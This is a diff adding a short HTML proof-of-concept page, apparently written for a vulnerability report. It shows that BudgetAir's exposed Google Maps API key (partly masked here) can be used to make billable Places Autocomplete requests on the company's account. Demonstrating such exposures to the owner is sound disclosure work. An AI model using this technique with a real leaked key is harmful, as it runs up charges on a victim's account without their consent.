@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>PoC — BudgetAir API Key Abuse</title>
+  <script src="https://maps.googleapis.com/maps/api/js?key=AIzaSyBu•••••••••••••••••••••••••••••••&libraries=places"></script>
+</head>
+<body>
+  <p>Each keystroke generates a billable Places Autocomplete request on BudgetAir's account:</p>
+  <input id="autocomplete" type="text" placeholder="Type any airport or city..." style="width:400px;padding:8px;">
+  <div id="status"></div>
+  <script>
+    const input = document.getElementById('autocomplete');
+    const ac = new google.maps.places.Autocomplete(input);
+    ac.addListener('place_changed', () => {
+      document.getElementById('status').innerText = 'Billed to BudgetAir: ' + ac.getPlace().name;
+    });
+  </script>
+</body>
+</html>
